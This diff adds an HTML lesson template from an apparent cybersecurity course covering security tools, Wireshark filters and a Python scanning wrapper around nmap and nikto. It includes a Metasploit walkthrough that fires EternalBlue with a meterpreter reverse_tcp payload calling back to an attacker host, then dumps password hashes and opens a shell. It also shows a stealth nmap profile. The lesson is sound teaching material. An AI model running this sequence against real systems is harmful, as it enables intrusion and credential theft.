@@ -1,0 +1,801 @@
+{% extends "base.html" %}
+
+{% block title %}Lesson 8: Security Tools & Frameworks{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <!-- Lesson Header -->
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <div>
+                <h1 class="h2">
+                    <span class="badge bg-info me-3">Lesson 8</span>
+                    {{ lesson.title }}
+                </h1>
+                <p class="text-muted mb-0">
+                    <i class="fas fa-clock me-1"></i>{{ lesson.duration }}
+                </p>
+            </div>
+            <div>
+                {% if not is_completed %}
+                <button class="btn btn-success" onclick="completeLesson({{ lesson_id }})">
+                    <i class="fas fa-check me-1"></i>Mark Complete
+                </button>
+                {% else %}
+                <span class="badge bg-success fs-6">
+                    <i class="fas fa-check me-1"></i>Completed
+                </span>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Lesson Navigation -->
+        <nav class="mb-4">
+            <div class="d-flex justify-content-between">
+                <a href="{{ url_for('lesson', lesson_id=7) }}" class="btn btn-outline-secondary">
+                    <i class="fas fa-arrow-left me-1"></i>Previous: Penetration Testing
+                </a>
+                <a href="{{ url_for('lesson', lesson_id=9) }}" class="btn btn-outline-info">
+                    Next: Incident Response <i class="fas fa-arrow-right ms-1"></i>
+                </a>
+            </div>
+        </nav>
+
+        <!-- Lesson Content -->
+        <div class="card">
+            <div class="card-body">
+                <h3>Security Tools & Frameworks</h3>
+                <p>Security professionals rely on specialized tools and frameworks to effectively identify, analyze, and mitigate security threats. This lesson covers essential tools across different categories of security testing and analysis.</p>
+
+                <h4>Tool Categories Overview</h4>
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <div class="card h-100 bg-dark border-info">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-info"><i class="fas fa-search me-2"></i>Reconnaissance Tools</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li><strong>Nmap:</strong> Network discovery and port scanning</li>
+                                    <li><strong>Masscan:</strong> High-speed port scanner</li>
+                                    <li><strong>Amass:</strong> In-depth attack surface mapping</li>
+                                    <li><strong>theHarvester:</strong> Email and subdomain gathering</li>
+                                    <li><strong>Shodan:</strong> Internet-connected device search</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <div class="card h-100 bg-dark border-warning">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-warning"><i class="fas fa-bug me-2"></i>Vulnerability Scanners</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li><strong>OpenVAS:</strong> Comprehensive vulnerability scanner</li>
+                                    <li><strong>Nessus:</strong> Professional vulnerability assessment</li>
+                                    <li><strong>Nikto:</strong> Web server vulnerability scanner</li>
+                                    <li><strong>Nuclei:</strong> Modern vulnerability scanner</li>
+                                    <li><strong>Qualys VMDR:</strong> Cloud-based scanning</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <div class="card h-100 bg-dark border-danger">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-danger"><i class="fas fa-crosshairs me-2"></i>Exploitation Tools</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li><strong>Metasploit:</strong> Comprehensive exploitation framework</li>
+                                    <li><strong>Cobalt Strike:</strong> Advanced threat emulation</li>
+                                    <li><strong>Empire:</strong> PowerShell post-exploitation</li>
+                                    <li><strong>BeEF:</strong> Browser exploitation framework</li>
+                                    <li><strong>SQLMap:</strong> SQL injection exploitation</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <div class="card h-100 bg-dark border-success">
+                            <div class="card-header">
+                                <h6 class="mb-0 text-success"><i class="fas fa-shield-alt me-2"></i>Defensive Tools</h6>
+                            </div>
+                            <div class="card-body">
+                                <ul class="small">
+                                    <li><strong>Snort:</strong> Network intrusion detection</li>
+                                    <li><strong>Suricata:</strong> Network security monitoring</li>
+                                    <li><strong>OSSEC:</strong> Host-based intrusion detection</li>
+                                    <li><strong>Wireshark:</strong> Network protocol analyzer</li>
+                                    <li><strong>Splunk:</strong> Security information and event management</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Metasploit Framework Deep Dive</h4>
+                <p>Metasploit is one of the most powerful and widely used penetration testing frameworks. It provides a comprehensive platform for developing, testing, and executing exploits.</p>
+
+                <h5>Metasploit Architecture</h5>
+                <div class="table-responsive">
+                    <table class="table table-dark table-striped">
+                        <thead>
+                            <tr>
+                                <th>Component</th>
+                                <th>Description</th>
+                                <th>Examples</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><span class="badge bg-danger">Exploits</span></td>
+                                <td>Code that takes advantage of vulnerabilities</td>
+                                <td>windows/smb/ms17_010_eternalblue</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-warning">Payloads</span></td>
+                                <td>Code executed after successful exploitation</td>
+                                <td>windows/meterpreter/reverse_tcp</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-info">Auxiliary</span></td>
+                                <td>Supporting modules for scanning and enumeration</td>
+                                <td>scanner/portscan/tcp</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-success">Encoders</span></td>
+                                <td>Modules to evade antivirus detection</td>
+                                <td>x86/shikata_ga_nai</td>
+                            </tr>
+                            <tr>
+                                <td><span class="badge bg-secondary">Post</span></td>
+                                <td>Post-exploitation modules</td>
+                                <td>windows/gather/hashdump</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h5>Basic Metasploit Commands</h5>
+                <pre><code class="language-bash"># Start Metasploit console
+msfconsole
+
+# Basic commands
+msf6 > help                    # Show available commands
+msf6 > search ms17-010         # Search for exploits
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > show options            # Display module options
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set payload windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 192.168.1.50
+msf6 > exploit                 # Run the exploit
+
+# Meterpreter commands (after successful exploitation)
+meterpreter > sysinfo          # System information
+meterpreter > getuid           # Current user
+meterpreter > ps               # List processes
+meterpreter > hashdump         # Dump password hashes
+meterpreter > screenshot       # Take screenshot
+meterpreter > shell            # Drop to system shell</code></pre>
+
+                <h4>Network Analysis with Wireshark</h4>
+                <p>Wireshark is the world's foremost network protocol analyzer, essential for network troubleshooting and security analysis.</p>
+
+                <h5>Key Features and Use Cases</h5>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6><i class="fas fa-network-wired text-info me-2"></i>Network Troubleshooting</h6>
+                        <ul class="small">
+                            <li>Analyze network performance issues</li>
+                            <li>Identify bandwidth bottlenecks</li>
+                            <li>Debug protocol implementations</li>
+                            <li>Monitor network health</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6><i class="fas fa-user-secret text-warning me-2"></i>Security Analysis</h6>
+                        <ul class="small">
+                            <li>Detect malicious network activity</li>
+                            <li>Analyze attack patterns</li>
+                            <li>Investigate security incidents</li>
+                            <li>Monitor for data exfiltration</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h5>Common Wireshark Filters</h5>
+                <pre><code class="language-bash"># IP-based filters
+ip.addr == 192.168.1.100      # Traffic to/from specific IP
+ip.src == 192.168.1.100       # Traffic from specific IP
+ip.dst == 192.168.1.100       # Traffic to specific IP
+
+# Protocol filters
+http                           # HTTP traffic only
+https or ssl                   # HTTPS/SSL traffic
+tcp.port == 80                 # Traffic on port 80
+udp.port == 53                 # DNS traffic
+
+# Content filters
+http contains "password"       # HTTP traffic containing "password"
+tcp contains "GET"             # TCP traffic containing "GET"
+
+# Advanced filters
+tcp.flags.syn == 1 and tcp.flags.ack == 0  # SYN packets (connection attempts)
+http.response.code == 404      # HTTP 404 responses
+dns.qry.name contains "malware" # DNS queries for domains containing "malware"</code></pre>
+
+                <h4>Python Tool Integration Framework</h4>
+                <pre><code class="language-python">#!/usr/bin/env python3
+import subprocess
+import json
+import time
+import os
+import sys
+from datetime import datetime
+
+class SecurityToolsManager:
+    def __init__(self, target, output_dir="security_scan"):
+        self.target = target
+        self.output_dir = output_dir
+        self.results = {
+            'target': target,
+            'timestamp': datetime.now().isoformat(),
+            'tools_used': [],
+            'findings': []
+        }
+        
+        # Create output directory
+        os.makedirs(output_dir, exist_ok=True)
+    
+    def run_nmap_scan(self, scan_type="comprehensive"):
+        """Run Nmap scan with different profiles"""
+        print(f"Running Nmap {scan_type} scan on {self.target}...")
+        
+        scan_profiles = {
+            'quick': ['-sS', '-F', '--open'],
+            'comprehensive': ['-sS', '-sV', '-O', '--script=vuln', '-p-'],
+            'stealth': ['-sS', '-f', '-T2', '--randomize-hosts'],
+            'udp': ['-sU', '--top-ports', '1000']
+        }
+        
+        nmap_cmd = ['nmap'] + scan_profiles.get(scan_type, scan_profiles['quick']) + [self.target]
+        
+        try:
+            result = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=3600)
+            
+            if result.returncode == 0:
+                # Save raw output
+                with open(f"{self.output_dir}/nmap_{scan_type}.txt", 'w') as f:
+                    f.write(result.stdout)
+                
+                # Parse results
+                findings = self.parse_nmap_output(result.stdout, scan_type)
+                self.results['tools_used'].append(f"nmap_{scan_type}")
+                self.results['findings'].extend(findings)
+                
+                print(f"Nmap {scan_type} scan completed. Found {len(findings)} findings.")
+                return findings
+            else:
+                print(f"Nmap scan failed: {result.stderr}")
+                return []
+                
+        except subprocess.TimeoutExpired:
+            print("Nmap scan timed out")
+            return []
+        except Exception as e:
+            print(f"Error running Nmap: {e}")
+            return []
+    
+    def parse_nmap_output(self, output, scan_type):
+        """Parse Nmap output for security findings"""
+        findings = []
+        lines = output.split('\n')
+        
+        current_port = None
+        for line in lines:
+            line = line.strip()
+            
+            # Parse open ports
+            if '/tcp' in line and 'open' in line:
+                parts = line.split()
+                if len(parts) >= 3:
+                    port = parts[0].split('/')[0]
+                    service = parts[2] if len(parts) > 2 else 'unknown'
+                    
+                    findings.append({
+                        'type': 'open_port',
+                        'severity': 'info',
+                        'port': port,
+                        'service': service,
+                        'description': f"Open port {port} running {service}"
+                    })
+            
+            # Parse vulnerability script results
+            elif 'VULNERABLE' in line:
+                findings.append({
+                    'type': 'vulnerability',
+                    'severity': 'high',
+                    'description': line.strip(),
+                    'tool': f"nmap_{scan_type}"
+                })
+            
+            # Parse CVE references
+            elif 'CVE-' in line:
+                cve_match = line.strip()
+                findings.append({
+                    'type': 'cve',
+                    'severity': 'medium',
+                    'description': f"Potential CVE identified: {cve_match}",
+                    'tool': f"nmap_{scan_type}"
+                })
+        
+        return findings
+    
+    def run_nikto_scan(self):
+        """Run Nikto web vulnerability scan"""
+        print(f"Running Nikto web scan on {self.target}...")
+        
+        try:
+            # Check if web service is available first
+            web_ports = ['80', '443', '8080', '8443']
+            target_url = None
+            
+            for port in web_ports:
+                try:
+                    import requests
+                    test_url = f"http://{self.target}:{port}"
+                    response = requests.get(test_url, timeout=5)
+                    if response.status_code < 400:
+                        target_url = test_url
+                        break
+                except:
+                    continue
+            
+            if not target_url:
+                # Try HTTPS
+                try:
+                    test_url = f"https://{self.target}"
+                    response = requests.get(test_url, timeout=5, verify=False)
+                    if response.status_code < 400:
+                        target_url = test_url
+                except:
+                    pass
+            
+            if not target_url:
+                print("No web service detected, skipping Nikto scan")
+                return []
+            
+            # Run Nikto
+            nikto_cmd = ['nikto', '-h', target_url, '-Format', 'txt']
+            result = subprocess.run(nikto_cmd, capture_output=True, text=True, timeout=1800)
+            
+            if result.returncode == 0 or result.stdout:  # Nikto may return non-zero but still have output
+                # Save raw output
+                with open(f"{self.output_dir}/nikto.txt", 'w') as f:
+                    f.write(result.stdout)
+                
+                # Parse results
+                findings = self.parse_nikto_output(result.stdout)
+                self.results['tools_used'].append('nikto')
+                self.results['findings'].extend(findings)
+                
+                print(f"Nikto scan completed. Found {len(findings)} findings.")
+                return findings
+            else:
+                print(f"Nikto scan failed: {result.stderr}")
+                return []
+                
+        except subprocess.TimeoutExpired:
+            print("Nikto scan timed out")
+            return []
+        except Exception as e:
+            print(f"Error running Nikto: {e}")
+            return []
+    
+    def parse_nikto_output(self, output):
+        """Parse Nikto output for web vulnerabilities"""
+        findings = []
+        lines = output.split('\n')
+        
+        for line in lines:
+            line = line.strip()
+            
+            # Look for vulnerability indicators
+            if any(keyword in line.lower() for keyword in ['vulnerability', 'vulnerable', 'security']):
+                severity = 'medium'
+                if any(high_keyword in line.lower() for high_keyword in ['critical', 'high', 'exploit']):
+                    severity = 'high'
+                elif any(low_keyword in line.lower() for low_keyword in ['info', 'low']):
+                    severity = 'low'
+                
+                findings.append({
+                    'type': 'web_vulnerability',
+                    'severity': severity,
+                    'description': line,
+                    'tool': 'nikto'
+                })
+            
+            # Look for specific issues
+            elif any(issue in line.lower() for issue in ['xss', 'sql injection', 'directory traversal']):
+                findings.append({
+                    'type': 'web_vulnerability',
+                    'severity': 'high',
+                    'description': line,
+                    'tool': 'nikto'
+                })
+        
+        return findings
+    
+    def run_ssl_scan(self):
+        """Analyze SSL/TLS configuration"""
+        print(f"Running SSL analysis on {self.target}...")
+        
+        try:
+            # Use testssl.sh if available, otherwise use nmap ssl scripts
+            ssl_cmd = ['nmap', '--script', 'ssl-enum-ciphers,ssl-cert,ssl-heartbleed', 
+                      '-p', '443,8443', self.target]
+            
+            result = subprocess.run(ssl_cmd, capture_output=True, text=True, timeout=300)
+            
+            if result.returncode == 0:
+                # Save raw output
+                with open(f"{self.output_dir}/ssl_analysis.txt", 'w') as f:
+                    f.write(result.stdout)
+                
+                # Parse results
+                findings = self.parse_ssl_output(result.stdout)
+                self.results['tools_used'].append('ssl_analysis')
+                self.results['findings'].extend(findings)
+                
+                print(f"SSL analysis completed. Found {len(findings)} findings.")
+                return findings
+            else:
+                print(f"SSL analysis failed: {result.stderr}")
+                return []
+                
+        except Exception as e:
+            print(f"Error running SSL analysis: {e}")
+            return []
+    
+    def parse_ssl_output(self, output):
+        """Parse SSL/TLS analysis output"""
+        findings = []
+        lines = output.split('\n')
+        
+        for line in lines:
+            line = line.strip()
+            
+            # Check for weak ciphers
+            if any(weak in line.lower() for weak in ['weak', 'broken', 'deprecated', 'rc4', 'des']):
+                findings.append({
+                    'type': 'ssl_weakness',
+                    'severity': 'medium',
+                    'description': f"Weak SSL/TLS configuration: {line}",
+                    'tool': 'ssl_analysis'
+                })
+            
+            # Check for vulnerabilities
+            elif any(vuln in line.lower() for vuln in ['heartbleed', 'poodle', 'beast', 'crime']):
+                findings.append({
+                    'type': 'ssl_vulnerability',
+                    'severity': 'high',
+                    'description': f"SSL/TLS vulnerability detected: {line}",
+                    'tool': 'ssl_analysis'
+                })
+        
+        return findings
+    
+    def run_comprehensive_scan(self):
+        """Run all available security tools"""
+        print(f"Starting comprehensive security scan of {self.target}")
+        print("=" * 60)
+        
+        all_findings = []
+        
+        # Run different types of scans
+        scan_methods = [
+            ('nmap_quick', lambda: self.run_nmap_scan('quick')),
+            ('nmap_comprehensive', lambda: self.run_nmap_scan('comprehensive')),
+            ('nikto', self.run_nikto_scan),
+            ('ssl_analysis', self.run_ssl_scan)
+        ]
+        
+        for scan_name, scan_method in scan_methods:
+            try:
+                print(f"\n--- Running {scan_name} ---")
+                findings = scan_method()
+                all_findings.extend(findings)
+                time.sleep(2)  # Brief pause between scans
+            except KeyboardInterrupt:
+                print(f"\nScan interrupted during {scan_name}")
+                break
+            except Exception as e:
+                print(f"Error during {scan_name}: {e}")
+                continue
+        
+        # Generate comprehensive report
+        self.generate_comprehensive_report(all_findings)
+        return all_findings
+    
+    def generate_comprehensive_report(self, findings):
+        """Generate comprehensive security report"""
+        # Update results
+        self.results['findings'] = findings
+        self.results['total_findings'] = len(findings)
+        self.results['end_time'] = datetime.now().isoformat()
+        
+        # Save JSON results
+        with open(f"{self.output_dir}/comprehensive_results.json", 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        # Generate text report
+        report_lines = []
+        report_lines.append("COMPREHENSIVE SECURITY ASSESSMENT REPORT")
+        report_lines.append("=" * 60)
+        report_lines.append(f"Target: {self.target}")
+        report_lines.append(f"Scan Date: {self.results['timestamp']}")
+        report_lines.append(f"Tools Used: {', '.join(self.results['tools_used'])}")
+        report_lines.append("")
+        
+        # Executive Summary
+        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
+        for finding in findings:
+            severity = finding.get('severity', 'info').lower()
+            severity_counts[severity] = severity_counts.get(severity, 0) + 1
+        
+        report_lines.append("EXECUTIVE SUMMARY")
+        report_lines.append("-" * 20)
+        report_lines.append(f"Total Findings: {len(findings)}")
+        for severity, count in severity_counts.items():
+            if count > 0:
+                report_lines.append(f"{severity.capitalize()}: {count}")
+        report_lines.append("")
+        
+        # Detailed Findings
+        if findings:
+            report_lines.append("DETAILED FINDINGS")
+            report_lines.append("-" * 20)
+            
+            # Group by severity
+            for severity in ['critical', 'high', 'medium', 'low', 'info']:
+                severity_findings = [f for f in findings if f.get('severity', '').lower() == severity]
+                if severity_findings:
+                    report_lines.append(f"\n{severity.upper()} SEVERITY ({len(severity_findings)} findings):")
+                    report_lines.append("-" * 30)
+                    
+                    for i, finding in enumerate(severity_findings, 1):
+                        report_lines.append(f"{i}. {finding['description']}")
+                        if 'tool' in finding:
+                            report_lines.append(f"   Tool: {finding['tool']}")
+                        if 'port' in finding:
+                            report_lines.append(f"   Port: {finding['port']}")
+                        report_lines.append("")
+        else:
+            report_lines.append("No security findings detected.")
+        
+        # Recommendations
+        report_lines.append("\nRECOMMendations")
+        report_lines.append("-" * 15)
+        
+        if severity_counts['critical'] > 0 or severity_counts['high'] > 0:
+            report_lines.append("• Immediate action required for critical and high-severity findings")
+            report_lines.append("• Conduct thorough vulnerability assessment")
+            report_lines.append("• Implement security patches and updates")
+        
+        if severity_counts['medium'] > 0:
+            report_lines.append("• Address medium-severity findings within 30 days")
+            report_lines.append("• Review security configurations")
+        
+        report_lines.append("• Implement regular security scanning")
+        report_lines.append("• Conduct penetration testing")
+        report_lines.append("• Train staff on security best practices")
+        
+        # Save text report
+        with open(f"{self.output_dir}/comprehensive_report.txt", 'w') as f:
+            f.write('\n'.join(report_lines))
+        
+        print(f"\n{'='*60}")
+        print("COMPREHENSIVE SECURITY SCAN COMPLETED")
+        print(f"{'='*60}")
+        print(f"Total findings: {len(findings)}")
+        print(f"Results saved to: {self.output_dir}/")
+        print("Generated files:")
+        print("- comprehensive_results.json (detailed results)")
+        print("- comprehensive_report.txt (summary report)")
+        print("- Individual tool outputs")
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 security_tools_manager.py <target>")
+        print("Example: python3 security_tools_manager.py example.com")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    print("Security Tools Manager")
+    print(f"Target: {target}")
+    print("=" * 40)
+    
+    # Initialize tools manager
+    tools_manager = SecurityToolsManager(target)
+    
+    try:
+        # Run comprehensive scan
+        findings = tools_manager.run_comprehensive_scan()
+        
+    except KeyboardInterrupt:
+        print("\nScan interrupted by user")
+    except Exception as e:
+        print(f"Scan failed: {e}")
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+                <h4>Tool Selection Guidelines</h4>
+                <div class="card bg-dark border-info">
+                    <div class="card-body">
+                        <h6 class="text-info">Choosing the Right Tools</h6>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>Consider These Factors:</h6>
+                                <ul class="small">
+                                    <li><strong>Purpose:</strong> What are you trying to achieve?</li>
+                                    <li><strong>Scope:</strong> Network, web app, or host-based testing?</li>
+                                    <li><strong>Environment:</strong> Internal vs external testing</li>
+                                    <li><strong>Stealth:</strong> Do you need to avoid detection?</li>
+                                    <li><strong>Compliance:</strong> Industry or regulatory requirements</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>Best Practices:</h6>
+                                <ul class="small">
+                                    <li>Start with passive reconnaissance</li>
+                                    <li>Use multiple tools for validation</li>
+                                    <li>Understand tool limitations</li>
+                                    <li>Keep tools updated</li>
+                                    <li>Document tool configurations</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Popular Security Distributions</h4>
+                <div class="row">
+                    <div class="col-md-4 mb-3">
+                        <div class="card bg-dark border-success h-100">
+                            <div class="card-body text-center">
+                                <i class="fab fa-linux fa-3x text-success mb-3"></i>
+                                <h6>Kali Linux</h6>
+                                <p class="small">Most popular penetration testing distribution with 600+ pre-installed tools</p>
+                                <ul class="small text-start">
+                                    <li>Debian-based</li>
+                                    <li>Regular updates</li>
+                                    <li>Extensive documentation</li>
+                                    <li>Active community</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-3">
+                        <div class="card bg-dark border-info h-100">
+                            <div class="card-body text-center">
+                                <i class="fab fa-linux fa-3x text-info mb-3"></i>
+                                <h6>Parrot Security OS</h6>
+                                <p class="small">Privacy-focused security distribution with lightweight design</p>
+                                <ul class="small text-start">
+                                    <li>Debian-based</li>
+                                    <li>AnonSurf for anonymity</li>
+                                    <li>Cryptocurrency support</li>
+                                    <li>Home and cloud editions</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-3">
+                        <div class="card bg-dark border-warning h-100">
+                            <div class="card-body text-center">
+                                <i class="fab fa-linux fa-3x text-warning mb-3"></i>
+                                <h6>BlackArch Linux</h6>
+                                <p class="small">Arch-based distribution with over 2000 security tools</p>
+                                <ul class="small text-start">
+                                    <li>Arch Linux-based</li>
+                                    <li>Largest tool collection</li>
+                                    <li>Rolling release model</li>
+                                    <li>Modular installation</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Exercise</h4>
+                <div class="card bg-dark border-warning">
+                    <div class="card-body">
+                        <h6><i class="fas fa-tasks text-warning me-2"></i>Security Tools Hands-On Lab</h6>
+                        <p><strong>Objective:</strong> Practice using various security tools in a controlled environment.</p>
+                        <ol>
+                            <li><strong>Tool Setup:</strong>
+                                <ul>
+                                    <li>Set up a Kali Linux VM or use existing tools</li>
+                                    <li>Install additional tools if needed</li>
+                                    <li>Configure target test environment</li>
+                                </ul>
+                            </li>
+                            <li><strong>Reconnaissance Phase:</strong>
+                                <ul>
+                                    <li>Use Nmap for network discovery</li>
+                                    <li>Run theHarvester for information gathering</li>
+                                    <li>Perform DNS enumeration</li>
+                                </ul>
+                            </li>
+                            <li><strong>Vulnerability Assessment:</strong>
+                                <ul>
+                                    <li>Run OpenVAS or Nessus scan</li>
+                                    <li>Use Nikto for web vulnerability testing</li>
+                                    <li>Analyze SSL/TLS configuration</li>
+                                </ul>
+                            </li>
+                            <li><strong>Tool Integration:</strong>
+                                <ul>
+                                    <li>Run the Python security tools manager</li>
+                                    <li>Compare results from different tools</li>
+                                    <li>Create comprehensive report</li>
+                                </ul>
+                            </li>
+                        </ol>
+                        <div class="alert alert-danger mt-2">
+                            <small><i class="fas fa-exclamation-triangle me-1"></i>Only use these tools on systems you own or have explicit authorization to test!</small>
+                        </div>
+                    </div>
+                </div>
+
+                <h4>Tool Maintenance and Updates</h4>
+                <div class="alert alert-info">
+                    <h6><i class="fas fa-tools me-2"></i>Keeping Tools Current</h6>
+                    <ul class="mb-0">
+                        <li><strong>Regular Updates:</strong> Keep tools updated with latest signatures and capabilities</li>
+                        <li><strong>Vulnerability Databases:</strong> Update CVE databases and exploit collections</li>
+                        <li><strong>Configuration Management:</strong> Maintain consistent tool configurations</li>
+                        <li><strong>Testing:</strong> Verify tools work correctly after updates</li>
+                        <li><strong>Documentation:</strong> Keep usage documentation current</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Progress Footer -->
+        <div class="mt-4 text-center">
+            <p class="text-muted">Lesson 8 of {{ total_lessons }}</p>
+            <div class="progress mx-auto" style="width: 300px; height: 8px;">
+                <div class="progress-bar bg-info" style="width: {{ (8 / total_lessons * 100) }}%"></div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function completeLesson(lessonId) {
+    fetch(`/complete/${lessonId}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            location.reload();
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+</script>
+{% endblock %}
